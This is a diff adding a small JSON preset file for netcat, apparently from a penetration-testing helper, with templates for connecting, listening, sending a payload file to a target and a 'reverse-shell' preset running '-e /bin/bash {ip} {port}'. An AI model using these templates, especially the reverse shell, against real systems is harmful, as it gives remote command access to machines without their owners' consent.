@@ -1,0 +1,25 @@
+{
+  "output_file": "netcat.txt",
+  "presets": [
+    {
+      "name": "basic-connect",
+      "description": "Connects to a target host and port.",
+      "command": "{ip} {port}"
+    },
+    {
+      "name": "listen-mode",
+      "description": "Sets Netcat to listen on a specific port.",
+      "command": "-lvp {port} -o {output_file}"
+    },
+    {
+      "name": "send-payload",
+      "description": "Sends a custom payload to a target host and port.",
+      "command": "{ip} {port} < {payload_file} > {output_file}"
+    },
+    {
+      "name": "reverse-shell",
+      "description": "Opens a reverse shell connection on a target.",
+      "command": "-e /bin/bash {ip} {port}"
+    }
+  ]
+}
